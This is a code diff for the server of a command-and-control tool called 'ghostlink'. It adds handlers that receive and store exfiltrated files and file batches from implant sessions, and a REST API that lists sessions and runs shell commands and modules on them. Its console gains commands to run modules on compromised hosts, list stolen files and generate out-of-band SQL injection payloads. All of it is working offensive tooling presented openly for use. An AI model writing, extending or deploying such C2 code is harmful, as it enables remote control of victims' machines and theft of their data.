@@ -15,9 +15,12 @@ import (
 	"sync"
 	"syscall"
 
+	"github.com/byjanke/ghostlink/pkg/api"
 	"github.com/byjanke/ghostlink/pkg/channel"
 	"github.com/byjanke/ghostlink/pkg/crypto"
+	"github.com/byjanke/ghostlink/pkg/exfil"
 	"github.com/byjanke/ghostlink/pkg/forward"
+	"github.com/byjanke/ghostlink/pkg/modules"
 	"github.com/byjanke/ghostlink/pkg/protocol"
 	"github.com/byjanke/ghostlink/pkg/shell"
 	"github.com/byjanke/ghostlink/pkg/socks"
@@ -137,7 +140,13 @@ func main() {
 	key := flag.String("key", "", "pre-shared key (empty = no encryption)")
 	ecdhe := flag.Bool("ecdhe", false, "automatic ECDH key exchange")
 	domain := flag.String("domain", "", "authoritative domain for DNS (enables auth DNS mode)")
+	apiAddr := flag.String("api", "", "REST API listen address (e.g. 127.0.0.1:8888)")
+	exfilDir := flag.String("exfil-dir", "./exfiltrated", "directory to save exfiltrated files")
 	flag.Parse()
+
+	if *exfilDir != "" {
+		os.MkdirAll(*exfilDir, 0755)
+	}
 
 	if *domain != "" && *channelType == "dns" {
 		runAuthDNS(*domain, *key, *ecdhe, *addr)
@@ -151,7 +160,7 @@ func main() {
 		mode = "PSK"
 	}
 
-	fmt.Printf("ghostlink c2 v0.8 | %s | %s | %s | proto v%d\n", *channelType, *addr, mode, protocol.ProtocolVersion)
+	fmt.Printf("ghostlink v1.0 | %s | %s | %s | proto v%d\n", *channelType, *addr, mode, protocol.ProtocolVersion)
 	fmt.Println("[*] waiting for connections...")
 
 	listener := channel.NewListener(channel.ChannelType(*channelType))
@@ -164,11 +173,23 @@ func main() {
 	defer listener.Close()
 
 	mgr := NewSessionManager()
+	modRegistry := modules.NewRegistry()
+
+	if *apiAddr != "" {
+		apiProvider := &c2APIProvider{mgr: mgr, modRegistry: modRegistry}
+		apiServer := api.NewServer(*apiAddr, apiProvider)
+		if err := apiServer.Start(); err != nil {
+			log.Printf("[-] api: %v", err)
+		} else {
+			fmt.Printf("[*] REST API on %s\n", *apiAddr)
+			defer apiServer.Close()
+		}
+	}
 
 	sigCh := make(chan os.Signal, 1)
 	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
 
-	go interactiveConsole(mgr)
+	go interactiveConsole(mgr, modRegistry, *exfilDir)
 
 	go func() {
 		for {
@@ -184,7 +205,7 @@ func main() {
 				s := mgr.Add(ch, remote, cryptoSes)
 				fmt.Printf("[+] session #%d registered\n", s.ID)
 				fmt.Print("c2> ")
-				handleSession(s, mgr)
+				handleSession(s, mgr, *exfilDir)
 				mgr.Remove(s.ID)
 				fmt.Printf("[-] session #%d closed\n", s.ID)
 				fmt.Print("c2> ")
@@ -223,7 +244,7 @@ func setupCrypto(ch channel.Channel, key string, ecdhe bool) *crypto.Session {
 }
 
 func runAuthDNS(domain, key string, ecdhe bool, addr string) {
-	fmt.Printf("ghostlink auth-dns v0.8 | domain: %s | %s\n", domain, addr)
+	fmt.Printf("ghostlink auth-dns v1.0 | domain: %s | %s\n", domain, addr)
 	fmt.Println("[*] authoritative DNS server starting...")
 
 	srv := channel.NewAuthDNSServer(domain)
@@ -343,7 +364,7 @@ func handleC2Command(line string, send func([]byte)) {
 	}
 }
 
-func handleSession(s *ManagedSession, mgr *SessionManager) {
+func handleSession(s *ManagedSession, mgr *SessionManager, exfilDir string) {
 	for s.Active {
 		data, err := s.Channel.Recv()
 		if err != nil {
@@ -378,6 +399,12 @@ func handleSession(s *ManagedSession, mgr *SessionManager) {
 			sessionSendMsg(s, resp)
 		case protocol.MsgCmdRes:
 			fmt.Printf("[result] %s\n", string(msg.Payload))
+		case protocol.MsgExfilFile:
+			handleExfilFile(msg, exfilDir, s)
+		case protocol.MsgExfilGlob:
+			handleExfilGlob(msg, exfilDir, s)
+		case protocol.MsgCanaryAlert:
+			fmt.Printf("[canary] alert from session #%d: %s\n", s.ID, string(msg.Payload))
 		case protocol.MsgFwdData:
 			handleFwdDataReceive(msg, s.Forwards)
 		case protocol.MsgFwdClose:
@@ -388,6 +415,8 @@ func handleSession(s *ManagedSession, mgr *SessionManager) {
 			handleSocksData(s, msg)
 		case protocol.MsgSocksClose:
 			handleSocksClose(s, msg)
+		case protocol.MsgModuleResult:
+			fmt.Printf("[module] %s\n", string(msg.Payload))
 		case protocol.MsgPing:
 			resp := protocol.Message{Type: protocol.MsgPong, StreamID: msg.StreamID}
 			sessionSendMsg(s, resp)
@@ -395,6 +424,60 @@ func handleSession(s *ManagedSession, mgr *SessionManager) {
 			fmt.Printf("[recv] %s\n", string(msg.Payload))
 		}
 	}
+}
+
+func handleExfilFile(msg protocol.Message, exfilDir string, s *ManagedSession) {
+	payload := string(msg.Payload)
+	parts := strings.SplitN(payload, "\x00", 3)
+	if len(parts) < 3 {
+		fmt.Printf("[exfil] malformed exfil message\n")
+		return
+	}
+	filename := parts[0]
+	sizeStr := parts[1]
+	data := []byte(parts[2])
+	var size int64
+	fmt.Sscanf(sizeStr, "%d", &size)
+
+	destPath := fmt.Sprintf("%s/%s_%d", exfilDir, filename, s.ID)
+	if err := os.WriteFile(destPath, data, 0644); err != nil {
+		fmt.Printf("[exfil] save error: %v\n", err)
+		return
+	}
+
+	fileHash := sha256.Sum256(data)
+	ack := fmt.Sprintf("OK:%s:%x", filename, fileHash[:8])
+	resp := protocol.Message{Type: protocol.MsgExfilAck, Payload: []byte(ack)}
+	sessionSendMsg(s, resp)
+
+	fmt.Printf("[exfil] received %s (%d bytes) -> %s [sha256:%x]\n", filename, size, destPath, fileHash[:8])
+}
+
+func handleExfilGlob(msg protocol.Message, exfilDir string, s *ManagedSession) {
+	files := exfil.DecodeFileList(msg.Payload)
+	fmt.Printf("[exfil-glob] received %d files from session #%d\n", len(files), s.ID)
+
+	for _, f := range files {
+		if f.Error != nil {
+			fmt.Printf("  [-] %s: %v\n", f.Path, f.Error)
+			continue
+		}
+
+		destPath := fmt.Sprintf("%s/%s_%d", exfilDir, f.Path, s.ID)
+		destDir := destPath[:strings.LastIndex(destPath, "/")]
+		os.MkdirAll(destDir, 0755)
+
+		if err := os.WriteFile(destPath, f.Content, 0644); err != nil {
+			fmt.Printf("  [-] %s: save error: %v\n", f.Path, err)
+			continue
+		}
+		fmt.Printf("  [+] %s — %d bytes -> %s\n", f.Path, len(f.Content), destPath)
+	}
+
+	fileHash := sha256.Sum256(msg.Payload)
+	ack := fmt.Sprintf("OK:%d_files:%x", len(files), fileHash[:8])
+	resp := protocol.Message{Type: protocol.MsgExfilAck, Payload: []byte(ack)}
+	sessionSendMsg(s, resp)
 }
 
 func handleSocksConnect(s *ManagedSession, msg protocol.Message) {
@@ -475,7 +558,7 @@ func handleFwdClose(msg protocol.Message, fwds map[uint32]*forward.Tunnel) {
 	t.CloseConn(uint32(cid))
 }
 
-func interactiveConsole(mgr *SessionManager) {
+func interactiveConsole(mgr *SessionManager, modRegistry *modules.Registry, exfilDir string) {
 	scanner := bufio.NewScanner(os.Stdin)
 	fmt.Print("c2> ")
 	for scanner.Scan() {
@@ -593,6 +676,60 @@ func interactiveConsole(mgr *SessionManager) {
 				fmt.Println("[*] ping sent")
 			}
 
+		case "modules":
+			fmt.Println("[*] available modules:")
+			fmt.Print(modRegistry.FormatList())
+
+		case "run":
+			s := mgr.Active()
+			if s == nil {
+				fmt.Println("[-] no active session")
+			} else if len(parts) < 2 {
+				fmt.Println("usage: run <module> [args...]")
+			} else {
+				modName := parts[1]
+				modArgs := parts[2:]
+				payload := modName
+				if len(modArgs) > 0 {
+					payload += "\x00" + strings.Join(modArgs, "\x00")
+				}
+				msg := protocol.Message{Type: protocol.MsgModuleExec, Payload: []byte(payload)}
+				sessionSendMsg(s, msg)
+				fmt.Printf("[*] module '%s' sent to session #%d\n", modName, s.ID)
+			}
+
+		case "sqli":
+			if len(parts) < 3 {
+				fmt.Println("usage: sqli <db> <domain> [query]")
+				fmt.Println("  db: mysql, mssql, oracle, postgres")
+			} else {
+			gen := modules.NewSQLiPayloadGenerator()
+			output, err := gen.Run(parts[1:])
+				if err != nil {
+					fmt.Printf("[-] %v\n", err)
+				} else {
+					fmt.Println(string(output))
+				}
+			}
+
+		case "exfils":
+			if exfilDir == "" {
+				fmt.Println("[-] exfil-dir not configured")
+			} else {
+				entries, err := os.ReadDir(exfilDir)
+				if err != nil {
+					fmt.Printf("[-] %v\n", err)
+				} else if len(entries) == 0 {
+					fmt.Println("[*] no exfiltrated files")
+				} else {
+					fmt.Printf("[*] %d exfiltrated files:\n", len(entries))
+					for _, e := range entries {
+						info, _ := e.Info()
+						fmt.Printf("  %s (%d bytes)\n", e.Name(), info.Size())
+					}
+				}
+			}
+
 		case "help":
 			fmt.Println("session management:")
 			fmt.Println("  sessions / list           — list all sessions")
@@ -604,7 +741,14 @@ func interactiveConsole(mgr *SessionManager) {
 			fmt.Println("  upload <local> <remote>   — upload file")
 			fmt.Println("  download <remote>         — download file")
 			fmt.Println("  ping                      — ping session")
-			fmt.Println("  exit                      — quit c2")
+			fmt.Println("modules:")
+			fmt.Println("  modules                   — list available modules")
+			fmt.Println("  run <module> [args...]     — run module on active session")
+			fmt.Println("exfiltration:")
+			fmt.Println("  exfils                    — list exfiltrated files")
+			fmt.Println("  sqli <db> <domain> [q]    — generate SQLi OOB payloads")
+			fmt.Println("other:")
+			fmt.Println("  exit                      — quit")
 
 		case "exit", "quit":
 			fmt.Println("[*] exiting...")
@@ -622,6 +766,77 @@ func interactiveConsole(mgr *SessionManager) {
 
 		fmt.Print("c2> ")
 	}
+}
+
+type c2APIProvider struct {
+	mgr         *SessionManager
+	modRegistry *modules.Registry
+}
+
+func (p *c2APIProvider) ListSessions() []api.SessionInfo {
+	list := p.mgr.List()
+	var result []api.SessionInfo
+	active := p.mgr.Active()
+	for _, s := range list {
+		isActive := active != nil && s.ID == active.ID
+		result = append(result, api.SessionInfo{
+			ID:     s.ID,
+			Remote: fmt.Sprintf("%v", s.Remote),
+			Active: isActive,
+		})
+	}
+	return result
+}
+
+func (p *c2APIProvider) GetActiveID() uint32 {
+	s := p.mgr.Active()
+	if s != nil {
+		return s.ID
+	}
+	return 0
+}
+
+func (p *c2APIProvider) SetActive(id uint32) bool {
+	return p.mgr.SetActive(id)
+}
+
+func (p *c2APIProvider) KillSession(id uint32) {
+	p.mgr.Remove(id)
+}
+
+func (p *c2APIProvider) ExecOnSession(id uint32, cmd string) error {
+	s := p.mgr.Get(id)
+	if s == nil {
+		return fmt.Errorf("session #%d not found", id)
+	}
+	msg := protocol.Message{Type: protocol.MsgCmdReq, Payload: []byte(cmd)}
+	sessionSendMsg(s, msg)
+	return nil
+}
+
+func (p *c2APIProvider) RunModuleOnSession(id uint32, module string, args []string) error {
+	s := p.mgr.Get(id)
+	if s == nil {
+		return fmt.Errorf("session #%d not found", id)
+	}
+	payload := module
+	if len(args) > 0 {
+		payload += "\x00" + strings.Join(args, "\x00")
+	}
+	msg := protocol.Message{Type: protocol.MsgModuleExec, Payload: []byte(payload)}
+	sessionSendMsg(s, msg)
+	return nil
+}
+
+func (p *c2APIProvider) ListModules() []map[string]string {
+	var result []map[string]string
+	for _, m := range p.modRegistry.List() {
+		result = append(result, map[string]string{
+			"name":        m.Name(),
+			"description": m.Description(),
+		})
+	}
+	return result
 }
 
 var _ = binary.BigEndian
